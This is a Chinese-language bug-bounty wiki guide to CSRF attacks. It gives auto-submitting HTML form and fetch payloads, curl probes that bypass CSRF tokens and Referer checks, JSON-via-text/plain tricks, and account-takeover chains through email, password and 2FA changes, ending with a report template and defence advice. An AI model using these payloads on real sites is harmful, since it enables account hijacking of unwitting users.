---
type: wiki
category: attack
tool: burp,manual
status: active
last-updated: 2026-04-21
---

# CSRF 完整指南（2026 版）

> **用途：** SameSite Lax 變 Chrome 預設後，很多人以為 CSRF 死了。其實仍有 3 類活路：
> (1) SameSite=None 的 site / iframe 內 legacy cookie / (2) Lax 對 top-level GET 不擋 / (3) Lax 對 POST 有 2 秒 window
> 加上 JSON CSRF、referrer bypass、token 不綁 user 等實作缺陷，CSRF 仍是 P2-P3 常見獎金。

## 0. 原理

Browser 自動附帶 cookie 到同 origin/subdomain 的 request。攻擊者構造 form 或 fetch，讓受害者「用他自己的 session」做攻擊者指定的動作（改密碼、轉帳、刪資料）。

```html
<!-- 攻擊者頁面 evil.com -->
<form action="https://target.com/account/delete" method="POST" id="x">
  <input name="confirm" value="yes">
</form>
<script>document.getElementById('x').submit()</script>

<!-- Victim 打開 evil.com → 自動 POST → cookie 附上 → 帳號被刪 -->
```

## 1. 2026 年 SameSite 現況

### 1.1 Chrome / Firefox / Edge default

```
Set-Cookie: session=xxx                       ← 無 SameSite → 當 Lax
Set-Cookie: session=xxx; SameSite=Strict      ← 完全不跨站送
Set-Cookie: session=xxx; SameSite=Lax         ← 僅 top-level GET 跨站送
Set-Cookie: session=xxx; SameSite=None; Secure ← 完全不阻擋（需 HTTPS）
```

### 1.2 SameSite Lax 例外（重要漏洞面）

#### 例外 A：Top-level navigation（GET）

```html
<!-- 從 evil.com top-level redirect 到 target -->
<meta http-equiv="refresh" content="0;url=https://target.com/api/delete?id=123">
```

若 target 用 GET 處理 state-changing（壞設計）→ CSRF 通過。

#### 例外 B：2-second window for POST（Chrome 80+ 特殊規則）

「新 cookie（< 2 秒）」的 POST 跨站也送。若使用者剛登入後 2 秒內跳到 evil.com → CSRF 成立。

實務 exploit 難觸發但**存在**，報告可舉為 defense-in-depth。

#### 例外 C：SameSite=None + iframe

```html
<iframe src="https://target.com/account/delete?id=123"></iframe>
<!-- 若 cookie SameSite=None → iframe 內 GET 帶 cookie -->
```

### 1.3 快速檢查目標 cookie

```bash
curl -sk -I https://target.com/login -c /dev/stdout | grep -i samesite
# 或登入後看 DevTools → Application → Cookies → SameSite 欄
```

## 2. 典型 CSRF PoC

### 2.1 Form-based GET

```html
<img src="https://target.com/transfer?to=attacker&amt=1000" style="display:none">
```

### 2.2 Form-based POST

```html
<form action="https://target.com/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit">
</form>
<script>document.forms[0].submit()</script>
```

### 2.3 Fetch（只在 CORS allow 才有 cookie）

```javascript
fetch('https://target.com/api/delete', {
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'id=1'
});
// 若 target 有 Access-Control-Allow-Credentials + ACAO 不是 wildcard → CSRF
```

## 3. Token bypass 技巧

### 3.1 Token 不驗（最常見）

```bash
# 正常請求
curl -X POST /api/delete -d 'id=1&csrf_token=abc'
→ 200

# 移除 token
curl -X POST /api/delete -d 'id=1'
→ 200 or 仍成功 → token 沒驗
```

### 3.2 Token 是空字串就過

```bash
curl -X POST /api/delete -d 'id=1&csrf_token='
```

### 3.3 Token 不綁 user

```bash
# 用 attacker 自己 session 拿到 token
# 塞到 victim form

TOKEN=$(curl -sc - /login | grep XSRF | awk '{print $7}')
# 放到 victim 的 fetch 裡 → 有些 app 只檢查「token 存在且格式對」而不驗 owner
```

### 3.4 Token 可預測 / 靜態

```
# 連續幾次拿 token
for i in {1..5}; do curl -s /api/token ; done
# 若每次相同 或序列遞增 → 攻擊者可預測
```

### 3.5 Method override bypass

```bash
# 改 GET 繞 CSRF check（有些 app 只檢查 POST）
curl "https://target.com/api/delete?id=1&_method=DELETE"

# 或透過 X-HTTP-Method-Override
curl -X POST "https://target.com/api/data" \
  -H "X-HTTP-Method-Override: DELETE" \
  -d 'id=1'
```

### 3.6 Referer check bypass

```
# App 只檢查 "Referer contains target.com"
Referer: https://evil.com/target.com/
Referer: https://target.com.evil.com/
Referer: https://evil.com/?target.com

# App 檢查 exact match → 用 https→http 降級 / data URL / 移除
# 某些 app 沒 referer 時放行（strip via meta refresh）
<meta name="referrer" content="no-referrer">
```

### 3.7 Content-Type bypass（JSON CSRF）

多數 app 只接受 `application/json`，認為 form 攻擊打不到。但：

**方法 A：text/plain 塞 JSON**

```html
<form enctype="text/plain" action="https://target.com/api/delete" method="POST">
  <input name='{"id":1,"_pad":"' value='pad"}'>
</form>
<script>document.forms[0].submit()</script>
```

Browser 送 `Content-Type: text/plain`，body = `{"id":1,"_pad":"=pad"}`。如果 server lazy parse（讀到 `{` 就當 JSON）→ 成立。

**方法 B：fetch + simple CORS**

```javascript
fetch('https://target.com/api/delete', {
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'text/plain'},  // simple，無 preflight
  body:'{"id":1}'
});
```

`text/plain/multipart/form-data/application/x-www-form-urlencoded` 是 simple Content-Type，不觸發 preflight。若 server 讀 JSON（Express express.json() 看 Content-Type → 不 parse，但若用 `express.text()` or raw body parse → 成立）→ 繞過。

**方法 C：Flash / SWF relay**（老，Chrome 不支援）

### 3.8 Double-submit cookie bypass

有些 app 存 CSRF token 在 cookie + request body，比對。攻擊者若能**在 target domain 設 cookie**（通過 subdomain XSS / cookie tossing）→ 設自己 token → 繞。

## 4. 2FA / Password reset CSRF（高獎金 ATO）

### 4.1 2FA disable via CSRF

```
POST /api/2fa/disable
→ 若無 token 或 token 可繞 → attacker disable victim 的 2FA → 進 ATO 鏈
```

### 4.2 Password reset via CSRF

```html
<form action="https://target.com/account/password" method="POST">
  <input name="new_password" value="attacker_pass">
  <input name="confirm" value="attacker_pass">
</form>
```

若不需要 old password + token 缺 → ATO

### 4.3 Email change CSRF（post-reset）

```
POST /account/email
email=attacker@evil.com

→ 改 email → 從 evil.com 點 reset link → ATO
```

## 5. OAuth CSRF

### 5.1 OAuth callback 無 state check

```
Attacker 流程:
1. 用自己 OAuth flow 取到 code
2. 把 code 放到 victim 瀏覽器:
   https://target.com/oauth/callback?code=ATTACKER_CODE
3. Victim click → target 把 ATTACKER_GOOGLE_ACCOUNT 連到 victim's target account
4. Attacker 用自己 Google 登入 → 進到 victim 的 target 帳號
```

詳見 [16-oauth-attack-chains.md](16-oauth-attack-chains.md) §4.

## 6. Referrer-free techniques（新）

```html
<!-- Cross-Origin Opener Policy bypass -->
<a href="https://target.com/api/delete?id=1" rel="noreferrer noopener">click</a>

<!-- data: URL -->
<meta http-equiv="refresh" content="0;url=data:text/html,<form...">
```

## 7. Tools

### 7.1 Burp CSRF PoC generator

```
Burp Pro → Right-click request → Engagement tools → Generate CSRF PoC
→ 自動產生 HTML form + submit script
```

### 7.2 xsrfprobe

```bash
pip3 install xsrfprobe
xsrfprobe -u https://target.com/ --crawl
# 自動 crawl + 偵測 token 機制 + fuzz bypass
```

### 7.3 Nuclei CSRF templates

```bash
nuclei -u https://target.com -tags csrf
# 偵測 cookie SameSite 設定錯、缺 token、token 不驗
```

## 8. PoC 完整流程：Email change via CSRF

### Step 1: 確認目標 endpoint
```
POST /api/account/email
Content-Type: application/json
Cookie: session=...

{"email":"new@x.com"}
```

### Step 2: 檢查防禦
```bash
# SameSite
curl -I -c /dev/stdout https://target.com/login | grep -i samesite
# 若 SameSite=None or 無 → 可攻擊

# Token 驗證
curl -X POST /api/account/email \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=...' \
  -d '{"email":"a@b.c"}'
# 無 token → 若 200 成功 → vulnerable

# Content-Type 限制
curl -X POST /api/account/email \
  -H 'Content-Type: text/plain' \
  -H 'Cookie: session=...' \
  -d '{"email":"a@b.c"}'
# 若 200 → JSON CSRF 可行
```

### Step 3: 構造 PoC
```html
<!-- evil.com/poc.html -->
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://target.com/api/account/email"
      method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","_":"' value='"}'>
</form>
<script>document.getElementById('csrf').submit()</script>
</body>
</html>
```

### Step 4: 測試
1. Victim 登入 target.com
2. Victim 打開 evil.com/poc.html
3. Victim 的 email 被改為 attacker@evil.com
4. Attacker 發 password reset 到 attacker@evil.com → ATO

## 9. 報告 template

```markdown
## 漏洞概述
https://target.com/api/account/email 對使用者 email 變更未驗證 CSRF token，
且接受 `Content-Type: text/plain` 讓 JSON body 能被 form-based CSRF 送出（不觸發
preflight），加上 session cookie 為 `SameSite=None` → 完整 CSRF → 被動 ATO chain。

## 重現步驟

### Step 1: 確認 email change API
[curl 無 token 即成功]

### Step 2: JSON CSRF PoC
[HTML]

### Step 3: 攻擊鏈
Victim login → 打開 evil.com → email 改 → password reset → ATO

## Impact
- 任一 logged-in victim 可被 CSRF 改 email
- Chained with password reset → Full Account Takeover
- 無使用者互動（1-click）

## Severity
P2 / High（若是 admin/high-priv user → P1）
```

## 10. 防禦角度（寫修補建議用）

```
1. 所有 state-changing endpoint 驗 CSRF token (Synchronizer / Double-submit)
2. Token 必須綁 user + session + 有效期
3. Token 比對用 timing-safe compare
4. Cookie SameSite=Strict（或 Lax 不搭 legacy OAuth）
5. 敏感操作（2FA disable, email change, password change）多一道：
   - Recent re-auth（最近 5 分鐘內輸密碼）
   - Email 確認連結
   - 2FA step-up
6. Content-Type strict: 若 JSON 只收 application/json + 有 token + 有 Origin/Referer check
```

## 關聯文件

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 4 OAuth state CSRF
- [64-cache-poisoning.md](64-cache-poisoning.md) — 某些 CSRF 配 cache 可無受害者
- PortSwigger CSRF：https://portswigger.net/web-security/csrf
- OWASP CSRF Prevention：https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- xsrfprobe：https://github.com/0xInfection/XSRFProbe
